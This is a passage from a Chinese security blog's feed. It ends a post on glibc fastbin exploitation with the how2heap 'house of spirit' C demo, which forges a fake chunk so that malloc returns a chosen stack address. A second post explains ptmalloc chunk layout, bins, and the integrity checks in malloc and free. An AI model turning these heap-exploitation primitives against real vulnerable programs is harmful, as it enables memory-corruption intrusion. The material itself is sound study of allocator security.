  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This file demonstrates the house of spirit attack.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Calling malloc() once so that it sets up its memory.\n"</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We will now overwrite a pointer to point to a fake 'fastbin' region.\n"</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a;</span><br><span class="line">	<span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n"</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">7</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span>);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"</span>);</span><br><span class="line">        <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">	fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Freeing the overwritten pointer.\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(0x30): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  示例的结果如下图所示:</p>
<p>  <img src="/2017/09/24/linux堆内存漏洞利用之fastbin/houseofspirit.png" alt="house of spirit"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">how2heap</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;背景介绍&quot;&gt;&lt;a href=&quot;#背景介绍&quot; class=&quot;headerlink&quot; title=&quot;背景介绍&quot;&gt;&lt;/a&gt;背景介绍&lt;/h2&gt;&lt;p&gt;  在&lt;a href=&quot;http://blog.binpang.me/2017/09/22/ptmalloc%E5%A0%8
    
    </summary>
    
      <category term="ptmalloc" scheme="http://bin2415.github.io/categories/ptmalloc/"/>
    
    
      <category term="exploit" scheme="http://bin2415.github.io/tags/exploit/"/>
    
      <category term="fastbin" scheme="http://bin2415.github.io/tags/fastbin/"/>
    
  </entry>
  
  <entry>
    <title>ptmalloc堆内存管理</title>
    <link href="http://bin2415.github.io/2017/09/22/ptmalloc%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    <id>http://bin2415.github.io/2017/09/22/ptmalloc堆内存管理/</id>
    <published>2017-09-22T12:11:38.000Z</published>
    <updated>2018-12-23T05:33:53.018Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>Linux的栈内存管理相信大家都已经很熟悉了，针对栈内存的攻击也是比较常见的。然而对于堆内存的管理机制可能不太熟悉，针对堆内存的攻击也是比较困难的，所以我通过阅读各种资料以及Glibc的相关源码，对Glibc下的堆内存管理机制有了一定的了解，故在此记录下学习心得。</p>
<p>首先不同平台的堆内存管理机制是不一样的，我现在主要是针对Glibc的堆内存管理机制进行分析，Glibc的堆内存管理机制叫做ptmalloc。其他的一些比较流行的管理机制有：</p>
<ol>
<li>jemalloc(FreeBSD, Firefox, Android)</li>
<li>ptmalloc(Glibc)</li>
<li>tcmalloc(Google)</li>
<li>libumem(Solaris)</li>
</ol>
<h2 id="Chunk-structure"><a href="#Chunk-structure" class="headerlink" title="Chunk structure"></a>Chunk structure</h2><p>在Glibc的堆内存管理中，chunk是堆内存分配的基本的单位，它表示堆内存中连续的内存单元。比方说我们通过malloc(8)申请一个连续的8字节内存，则Glibc会分配我们一个大小为8(chunk size + previous size)+8(payload)大小的chunk。chunk分为allocated chunk和freed chunk。chunk structure在Glibc的定义如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>从上面的结构我们可以看出，如果一个chunk为allocated chunk，则它需要分配prev_size和size域，其中prev_size和size(表示整个chunk的大小，包括sizeof(prev_size)+sizeof(size)+sizeof(payload))用来在进行free()操作的时候将与该chunk空间上相邻的freed chunk进行合并，减少了堆内存空间的碎片化（具体怎么合并的在下面会具体介绍）。如果一个chunk为freed chunk的话，其相对于allocated chunk来说又多了两个域–fd和bk指针。因为freed chunk是通过多个链表结构将所有的freed chunk链接了起来，这样便于malloc函数快速找到合适大小的freed chunk，并且该这些表是双向链表(fastbins除外)。</p>
<p>所以对于malloced chunk来说，具体的内存区域如下所示:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    |             prev_size:Size of previous chunk, <span class="keyword">if</span> allocated  | |</span><br><span class="line">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    |             Size of chunk, in bytes                       |M|P|</span><br><span class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    |             User data starts here...                          .</span><br><span class="line">	    .                                                               .</span><br><span class="line">	    .             (malloc_usable_size() bytes)                      .</span><br><span class="line">	    .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    |             Size of chunk                                     |</span><br><span class="line">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure></p>
<p>在size域，有两个标志位，一个为M，一个为P。M表示该chunk是否是allocated chunk，P表示与该chunk空间上相邻的之前的chunk是否是freed chunk，如果该标识为0，表示previous chunk为freed chunk,则prev_size域表示previous chunk的大小; 否则如果previous chunk为allocated chunk，则记录previous chunk的大小就没有意义，此时就将prev_size域当做previous chunk的payload的一部分。</p>
<p>对于freed chunk来说，具体的内存区域如下所示:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    |             Size of previous chunk                            |</span><br><span class="line">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    `head:' |             Size of chunk, in bytes                         |P|</span><br><span class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    |             Forward pointer to next chunk in <span class="built_in">list</span>             |</span><br><span class="line">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    |             Back pointer to previous chunk in <span class="built_in">list</span>            |</span><br><span class="line">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    |             Unused space (may be 0 bytes long)                .</span><br><span class="line">	    .                                                               .</span><br><span class="line">	    .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    `foot:' |             Size of chunk, in bytes                           |</span><br><span class="line">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure></p>
<p>对于freed chunk来说，就多了两个域：fd和bk，这两个域分别指向该链表中的前一个元素和后一个元素。</p>
<h2 id="Bins"><a href="#Bins" class="headerlink" title="Bins"></a>Bins</h2><p>在Glibc的堆内存管理中，bin是将一个个freed chunk链接起来的链表，而bins就是存储这些链表的一维数组。每一个bin都是双向链表。根据freed chunk的大小将其分为了不同的136个bin，其中有10个为fastbin, 62个small bin，63个large bin和一个unsorted bin。在malloc_state结构中，就定义了这些bin的数组，具体声明如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="keyword">mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> THREAD_STATS</span></span><br><span class="line">  <span class="comment">/* Statistics for locking.  Only used if THREAD_STATS is defined.  */</span></span><br><span class="line">  <span class="keyword">long</span> stat_lock_direct, stat_lock_loop, stat_lock_wait;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<h3 id="Fast-Bins"><a href="#Fast-Bins" class="headerlink" title="Fast Bins"></a>Fast Bins</h3><p>在Glibc的堆内存管理机制中，一共有10个fast bin,每个fast bin链表中的所有freed chunk的大小(sizeof(prev_size)+sizeof(size)+sizeof(payload))都是相等的。每个fast bin都是一个单链表( )。Fastbins中最小的bin中的chunk大小为16字节，随后每个bin都增加8字节，所以最大的bin为80字节。需要注意的是，fast bin和其它的bin在free处理的时候有很大的不同，fast bin中的chunk的M标志都为1，因此在进行free处理的时候不进行freed chunk的合并操作(具体的合并操作在下文会具体介绍)。在每一个fast bin链表中，当有新的freed chunk需要插入时，会插入到该链表的尾部，删除也是从尾部删除，因此形成了一个先入后出(FILO)的策略。</p>
<h3 id="Small-Bins"><a href="#Small-Bins" class="headerlink" title="Small Bins"></a>Small Bins</h3><p>Small bin的个数为62个，每一个small bin是一些大小相等的freed chunk组成的循环双向链表。当有新的freed chunk加入到该链表中，就加入到该链表的头部；如果要从链表中删除一个freed chunk时，则从该链表的为尾部删除，因此形成了一个先入先出(FIFO)的策略。第一个small bin中的freed chunk的大小都是16 bytes，后面每一个small bin的freed chunk的大小都依次增加8 bytes，因此最后一个small bin的freed chunk的大小为512 bytes。</p>
<h3 id="Large-Bins"><a href="#Large-Bins" class="headerlink" title="Large Bins"></a>Large Bins</h3><p>与small bin和fast bin不同的是，每一个large bin中的freed chunk的大小不一定相等，其只是表示一个范围，在前32个large bin中，以64字节为步长，即第一个large bin中的chunk大小为512~575字节，第二个large bin中的free chunk大小为576~639字节。紧随其后的16个large bin依次以512字节步长为间隔；之后的8个bin以步长4096为间隔；再之后的4个bin以32768字节为间隔；之后的2个bin以262144字节为间隔；剩下的chunk就放在最后一个large bin中。</p>
<h3 id="Unsorted-Bin"><a href="#Unsorted-Bin" class="headerlink" title="Unsorted Bin"></a>Unsorted Bin</h3><p>只有一个unsorted sin，其主要存储两种chunk。一种是在malloc()操作中由于要分配的大小比freed chunk的大小要小，所以需要将该freed chunk进行分割，返回与要分配的大小相符的chunk，剩余的freed chunk则加入unsorted bin中；另一种是在free()操作之后，会返回一个新的freed chunk，该freed chunk(不在fast bin范围的chunk)则加入unsorted bin中。设置这一个bin的主要目的是扮演一个缓存层的角色以加快分配和释放的操作。</p>
<h3 id="Top-chunk"><a href="#Top-chunk" class="headerlink" title="Top chunk"></a>Top chunk</h3><p>有一个特殊的chunk没有在以上的bins中，那就是top chunk，top chunk可以看做是heap的一个边界，当所有的bin中的chunk大小都不符合所请求的大小时，就从该chunk中进行分配，如果top chunk的大小大于所请求的大小时，则将top chunk分为两部分，一个是用户请求的chunk，剩余的部分就会成为一个新的chunk。否则，就需要扩展通过上移top chunk指针来扩展heap的大小(或者通过mmap来分配新的heap)。</p>
<h2 id="Malloc"><a href="#Malloc" class="headerlink" title="Malloc"></a>Malloc</h2><p>malloc函数是堆内存管理中最重要的一个函数之一，其在glibc中的包装函数为__libc_malloc(size_t)函数，在该函数中主要是进行一些准备性的工作–查找对应的arena结构，然后调用真正的分配内存的函数 _int_malloc(ar_ptr, bytes)。arena在glibc中的结构为malloc_state结构，主要存储bins，top chunk等结构。下面我们来看一下主要的分配函数_int_malloc的具体实现。</p>
<p>_int_malloc (mstate av, size_t bytes)</p>
<ol>
<li><p>首先_int_malloc函数根据要请求的内存大小bytes来计算要请求的chunk的大小nb。主要是加上size和prev_size域和对齐的padding。</p>
</li>
<li><p>得到了要请求的chunk大小之后，首先判断该chunk的大小是否在fast bins的范围内，如果在它们的范围内就在fast bins中找到大小相符的chunk来分配。</p>
<p><img src="/2017/09/22/ptmalloc堆内存管理/fastbin_malloc.png" alt="fast bin图片"></p>
</li>
<li><p>如果要请求的大小不在fast bins范围之内或者相应的fast bin链表为空，则会判断其chunk size是否在small bins的范围之内，找到对应的small bin，取出该small bin尾部的那个chunk进行分配。<br><img src="/2017/09/22/ptmalloc堆内存管理/smallbin_malloc.png" alt="small bin图片"></p>
</li>
<li><p>如果请求的大小是一个比较大的请求，则将fast bins进行合并。其要做fast bins合作的目的是为了避免有fast bins所引起的内存碎片化问题。在实际的操作中，程序一般都是分配小的内存或者分配大的内存，而不怎么会即分配大的内存又分配小的内存。所以这样的策略在实际的程序中效率还是很理想的。</p>
<p><img src="/2017/09/22/ptmalloc堆内存管理/fastbin_consolidate.png" alt="fast bin合并图片"></p>
</li>
<li><p>由于unsorted bin中存储最近freed的chunk(包括第4步合并后的fast bins)，接下来会遍历unsorted bin中的所有freed chunk，直到找到freed chunk大小和请求的大小相等的为止，或者循环了10000次也会停止遍历unsorted bin。遍历unsorted bin是唯一一个将freed chunk插入到相应的small bins和large bins的操作。在遍历的过程中，将当前节点chunk从unsorted bin中删除，如果chunk大小与要请求的chunk大小正好一致，则将该chunk返回，停止遍历，否则，将当前节点的chunk放入相应的small bins和large bins中。</p>
<p><img src="/2017/09/22/ptmalloc堆内存管理/unsortedbin_lastremainder.png" alt="unsorted bin last remainder图片"></p>
<p><img src="/2017/09/22/ptmalloc堆内存管理/unsortedbin_insert.png" alt="unsorted bin insert图片"></p>
</li>
<li><p>遍历了unsorted bin之后仍然没有找到合适的freed chunk，接下来回从large bins中进行查找，首先从large bin中的chunk大于等于请求的chunk进行查找。</p>
<p><img src="/2017/09/22/ptmalloc堆内存管理/largebin_find.png" alt="large bin find"></p>
<p>如果该large bin为空或者最大的chunk比要请求的chunk的大小还要小，则找到chunk size范围更大的large bin，进行的操作和刚才介绍的操作一致。</p>
</li>
<li><p>如果要请求的大小比large bins中的chunk还要大，则需要查看top chunk的大小了，如果top chunk的大小比要请求的chunk的大小要大，则分割top chunk，将剩余的chunk继续作为top chunk的一部分，否则判断是否还有fastbins，如果有fastbins，则将fastbins合并。以上各种查询都没有找到合适的chunk，则只能调用sysmalloc函数来进行分配。</p>
<p><img src="/2017/09/22/ptmalloc堆内存管理/topchunk_malloc.png" alt="top chunk malloc"></p>
</li>
<li><p>至此，malloc的分配的过程已经介绍完了，总结一下其查找过程就是fastbins-&gt;smallbins-&gt;unsortedbins-&gt;largebins-&gt;topchunk</p>
</li>
</ol>
<h2 id="Free"><a href="#Free" class="headerlink" title="Free"></a>Free</h2><p>free函数也是堆内存管理中最重要的函数之一，堆内存的攻击也主要是针对free函数的进行的攻击。在glibc中，__libc_free(void<em> mem)为free(void</em> mem)函数的包装函数，其主要的功能也是找到malloc_state结构，然后再调用 _int_free(mstate av, mchunkptr p, int have_lock)函数。</p>
<ol>
<li><p>判断p指向的地址是否在p+chunksize(p)指向的地址之前，如果不符合该规则的话就会抛出错误(“free(): invalid pointer”)。</p>
</li>
<li><p>判断chunk的大小是否大于MINSIZE或者是不是MALLOC_ALIGNMENT的整数倍，否则抛出错误(“free(): invalid size”)</p>
</li>
<li><p>判断要free的chunk的大小是否落在了fast bins的范围内，如果落在了这个范围内，则将该freed chunk加入到对应的fast bin中。</p>
<p><img src="/2017/09/22/ptmalloc堆内存管理/fastbin_free.png" alt="free chunk fastbin"></p>
</li>
<li><p>判断该chunk是否是mmapped，如果不是，就进行各种判断防止部分针对free操作的攻击。</p>
<ul>
<li>判断要free的chunk是否是top chunk，如果是，则抛出错误(“double free or corruption (top)”)</li>
<li>判断next chunk在内存中是否在arean的范围内，如果不是，则抛出错误(“double free or corruption (out)”)</li>
<li>判断next chunk的P标志是否为真，如果不是，则抛出错误(“double free or corruption (!prev)”)</li>
<li>判断next chunk的大小是否正常范围之间，如果不是，则抛出错误(“free(): invalid next size (normal)”)</li>
</ul>
<p><img src="/2017/09/22/ptmalloc堆内存管理/nomalfree_error.png" alt="normal free error"></p>
<p>然后将与free的chunk与其相邻的freed chunk进行合并，合并了之后将它插入到unsorted bin中。</p>
<p><img src="/2017/09/22/ptmalloc堆内存管理/normalfree.png" alt="normal free"></p>
</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/?spm=a313e.7916648.0.0.73affabdV5vocG" target="_blank" rel="noopener">Understanding glibc malloc</a></li>
<li><a href="https://www.gitbook.com/book/dhavalkapil/heap-exploitation/details" target="_blank" rel="noopener">heap-exploitation</a></li>
<li><a href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916648.0.0.Oqn9vN&amp;articleid=315" target="_blank" rel="noopener">Linux堆内存管理深入分析(上)</a></li>
<li><a href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916648.0.0.36f39d7ebNe83t&amp;articleid=334" target="_blank" rel="noopener">Linux堆内存管理深入分析(下)</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;背景介绍&quot;&gt;&lt;a href=&quot;#背景介绍&quot; class=&quot;headerlink&quot; title=&quot;背景介绍&quot;&gt;&lt;/a&gt;背景介绍&lt;/h2&gt;&lt;p&gt;Linux的栈内存管理相信大家都已经很熟悉了，针对栈内存的攻击也是比较常见的。然而对于堆内存的管理机制可能不太熟悉，针对堆内
    
    </summary>
    
      <category term="malloc" scheme="http://bin2415.github.io/categories/malloc/"/>
    
    
      <category term="ptmalloc" scheme="http://bin2415.github.io/tags/ptmalloc/"/>
    
  </entry>
  
</feed>
